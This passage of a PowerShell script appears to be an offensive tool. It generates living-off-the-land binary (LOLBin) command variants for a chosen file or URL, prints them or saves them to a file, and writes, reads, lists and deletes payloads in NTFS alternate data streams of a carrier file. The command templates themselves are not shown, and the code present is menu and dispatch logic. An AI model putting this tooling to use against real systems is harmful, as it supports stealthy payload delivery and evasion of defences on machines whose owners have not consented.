    # List mode
    if ($List) {
        Write-Host ""
        Write-Host "  Available LOLBins:" -ForegroundColor Cyan
        Write-Host ""
        foreach ($entry in $LolBinDB.GetEnumerator()) {
            Write-Host "  $($entry.Key.PadRight(14)) " -NoNewline -ForegroundColor Green
            Write-Host $entry.Value.Desc
            $osColor = if ($entry.Value.OS -match '^REMOVED') { 'Red' } else { 'Cyan' }
            Write-Host "    os   : $($entry.Value.OS)" -ForegroundColor $osColor
            Write-Host "    note : $($entry.Value.Note)" -ForegroundColor Yellow
            Write-Host "    types: $($entry.Value.Types -join ', ')" -ForegroundColor DarkGray
            Write-Host ""
        }
        Write-Host ""
        return
    }

    # Resolve extension
    $ext = ''
    if ($LolBinFile) { $ext = [System.IO.Path]::GetExtension($LolBinFile).ToLower() }
    elseif ($LolBinUrl) {
        $path = $LolBinUrl.Split('?')[0]
        $ext  = [System.IO.Path]::GetExtension($path).ToLower()
    }
    if (-not $ext) { $ext = '*' }

    # Filter compatible LOLBins
    $compatible = [ordered]@{}
    foreach ($entry in $LolBinDB.GetEnumerator()) {
        if ($entry.Value.Types -contains '*' -or $entry.Value.Types -contains $ext -or $ext -eq '*') {
            $compatible[$entry.Key] = $entry.Value
        }
    }

    if ($compatible.Count -eq 0) {
        throw "No LOLBins found for extension '$ext'."
    }

    # Select LOLBin
    $chosenName = $LolBin
    if (-not $chosenName) {
        Write-Host ""
        Write-Host "  ┌─────────────────────────────────────────────┐" -ForegroundColor Magenta
        Write-Host "  │           LOLBin Generator                  │" -ForegroundColor Magenta
        Write-Host "  │  Extension : $($ext.PadRight(32))│" -ForegroundColor Magenta
        Write-Host "  ├─────────────────────────────────────────────┤" -ForegroundColor Magenta
        $names = @($compatible.Keys)
        for ($i = 0; $i -lt $names.Count; $i++) {
            $n    = $names[$i]
            $desc = $compatible[$n].Desc
            $desc = if ($desc.Length -gt 26) { $desc.Substring(0,26) } else { $desc }
            Write-Host ("  │  [{0,2}] {1,-14} {2,-26}│" -f ($i+1), $n, $desc) -ForegroundColor Magenta
        }
        Write-Host "  └─────────────────────────────────────────────┘" -ForegroundColor Magenta
        $raw = Read-Host "  Select LOLBin [#]"
        $idx = [int]$raw - 1
        if ($idx -lt 0 -or $idx -ge $names.Count) { throw "Invalid selection." }
        $chosenName = $names[$idx]
    }

    if (-not $LolBinDB.Contains($chosenName)) {
        throw "Unknown LOLBin '$chosenName'. Run with -List to see available options."
    }

    $cmds = Get-LolBinCommands -Name $chosenName -File $LolBinFile -Url $LolBinUrl -Arg $LolBinArg -Ext $ext

    Write-Host ""
    Write-Host "  LOLBin    : $chosenName"  -ForegroundColor Cyan
    Write-Host "  Purpose   : $($LolBinDB[$chosenName].Desc)" -ForegroundColor Cyan
    $osVal = $LolBinDB[$chosenName].OS
    $osColor2 = if ($osVal -match '^REMOVED') { 'Red' } else { 'Cyan' }
    Write-Host "  OS        : $osVal" -ForegroundColor $osColor2
    if ($LolBinDB[$chosenName].Note) { Write-Host "  Note      : $($LolBinDB[$chosenName].Note)" -ForegroundColor Yellow }
    if ($LolBinFile) { Write-Host "  File      : $LolBinFile" -ForegroundColor Cyan }
    if ($LolBinUrl)  { Write-Host "  URL       : $LolBinUrl"  -ForegroundColor Cyan }
    Write-Host ""
    Write-Host "  ┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Yellow
    Write-Host "  │                     Generated Commands                      │" -ForegroundColor Yellow
    Write-Host "  └─────────────────────────────────────────────────────────────┘" -ForegroundColor Yellow

    for ($i = 0; $i -lt $cmds.Count; $i++) {
        Write-Host ""
        Write-Host "  [$($i+1)] " -NoNewline -ForegroundColor Green
        Write-Host $cmds[$i] -ForegroundColor White
    }

    if ($Output) {
        $lines = @("# LOLBin: $chosenName", "# $($LolBinDB[$chosenName].Desc)", "")
        if ($LolBinFile) { $lines += "# File : $LolBinFile" }
        if ($LolBinUrl)  { $lines += "# URL  : $LolBinUrl" }
        $lines += ""
        for ($i = 0; $i -lt $cmds.Count; $i++) {
            $lines += "# Variant $($i+1)"
            $lines += $cmds[$i]
            $lines += ""
        }
        $lines | Set-Content -Path $Output -Encoding UTF8
        Write-Host "[+] Commands saved → $Output" -ForegroundColor Green
    }
    Write-Host ""
}

# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

Write-Banner

switch ($Mode) {

    'Info' {
        if (-not $Carrier) { throw "-Carrier is required for Info mode." }
        Invoke-Info -FilePath $Carrier
        if ($ShowHashes) { Show-Hashes $Carrier }
        if ($Encode)     { Invoke-EncodingMenu -FilePath $Carrier | Out-Null }
    }

    'Generate' {
        Invoke-Generate
    }

    'Util' {
        if (-not $Carrier) { throw "-Carrier is required for Util mode." }
        if (-not (Test-Path $Carrier)) { throw "File not found: $Carrier" }

        # ── ADS operations — mutually exclusive with normal util flow ──────────
        if ($AdsWrite) {
            if (-not $AdsStream) { throw "-AdsStream NAME is required with -AdsWrite." }
            Invoke-AdsWrite -CarrierPath $Carrier -StreamName $AdsStream -PayloadPath $AdsWrite
            return
        }
        if ($AdsRead) {
            if (-not $AdsStream) { throw "-AdsStream NAME is required with -AdsRead." }
            if (-not $Output)    { throw "-Output is required with -AdsRead." }
            Invoke-AdsRead -CarrierPath $Carrier -StreamName $AdsStream -OutputPath $Output
            return
        }
        if ($AdsList) {
            Invoke-AdsList -CarrierPath $Carrier
            return
        }
        if ($AdsDelete) {
            if (-not $AdsStream) { throw "-AdsStream NAME is required with -AdsDelete." }
            Invoke-AdsDelete -CarrierPath $Carrier -StreamName $AdsStream
            return
        }

        # ── Normal util flow ───────────────────────────────────────────────────
        Write-Host "[*] File: $Carrier" -ForegroundColor Cyan
        Invoke-PostProcess -WorkFile $Carrier -ProtectedFiles @($Carrier) | Out-Null
    }
}